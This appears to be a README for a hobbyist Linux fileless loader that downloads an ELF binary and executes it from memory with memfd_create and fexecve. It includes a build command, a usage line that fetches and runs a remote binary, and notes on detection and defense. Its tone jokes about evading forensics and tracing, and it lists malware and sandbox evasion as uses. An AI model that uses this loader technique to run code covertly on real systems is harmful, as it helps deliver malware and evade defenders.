# nodiskloader

This project demonstrates how to download and execute an ELF binary directly from memory using Linux syscalls `memfd_create()` and `fexecve()`, without touching the filesystem at all.

> **Live article with full explanation and defense strategies:**
> 📖 [proxydom.hashnode.dev](https://proxydom.hashnode.dev)

---

## What It Does?

* Downloads an ELF binary via HTTPS using libcurl
* Loads it entirely into RAM
* Executes it using `fexecve()` from an anonymous file created with `memfd_create()`
* Leaves no trace on disk

This technique is commonly used in:
* Red team operations
* Fileless malware
* Memory-based sandbox evasion

---

## How It Works (short summary, the whole thing is in the blog)

1. `memfd_create("name", MFD_CLOEXEC)`
   → Creates an anonymous, memory-backed file descriptor

2. `curl_easy_perform()` with a custom write callback
   → Downloads the remote ELF into a memory buffer

3. `write()`
   → Copies the memory buffer into the anonymous memfd

4. `fexecve(memfd, argv, envp)`
   → Executes the binary directly from the memory descriptor

> `MFD_CLOEXEC` flag ensures the FD is closed automatically on exec, avoiding leaks. (We don't want to get forensic-ed, right?)

---

## Build the loader

```bash
gcc -o elfloader loader.c -lcurl
```

---

## Example Usage

```bash
./elfloader https://your-server.com/mybinary
```

You will see the ELF run directly from memory. No temp files, no extraction. Absolute cinema.

---

## Detection & Defense

Check the article for a complete guide on how to detect and mitigate this technique. In short:

* Monitor syscalls like `memfd_create`, `fexecve`
* Audit anonymous executable memory mappings
* Use EDR with behavioral detection
* Apply SELinux/AppArmor rules to block in-memory execution

More here: [proxydom.hashnode.dev](https://proxydom.hashnode.dev)

---

## TO-DO things (that i will forget to do lmao)

* Replace the download buffer with AES-encrypted payloads (or maybe i will use XOR. or maybe both)
* Load from internal memory instead of remote source (but loading from an URL is more useful, in my opinion)
* Create a multi-architecture loader stub (Windows 11 count your days i'm coming for you)
* Use ephemeral memory for download buffer (this means the memory used to temporarily store the downloaded binary is not meant to be persistent or reused— it exists just long enough to be written to the in-memory file descriptor, and then it's freed. Doin all this to reduce forensic footprint.)
---

## Author

**Me, proxydom** 
🔗 [proxydom.hashnode.dev](https://proxydom.hashnode.dev)

---

## Disclaimer

This project is for educational and research purposes only. Do not use it in unauthorized environments.

> Don't f*ck around and find out. Stay safe out here, and NEVER do this on computer that you have no permission to run scripts like this (unless you know how to not get traced) (jk pls don't do illegal things)

## Donations
If you liked this, i don't mind a little donation. A beer in italy is like 2 or 3 dollars, and you will make a college student very happy.
* BTC: bc1ql5zpzztllj0syetgnl93py894qdc2vvk8kz3y0
* Solana: 8uenP8kx3biorCJwWm3M1LqiPwsnEPeekFUhTXUAKRMF
* ETH: 0x0Ad6D832dD1e27CD0d349B1857c209DFe6C4C2F6
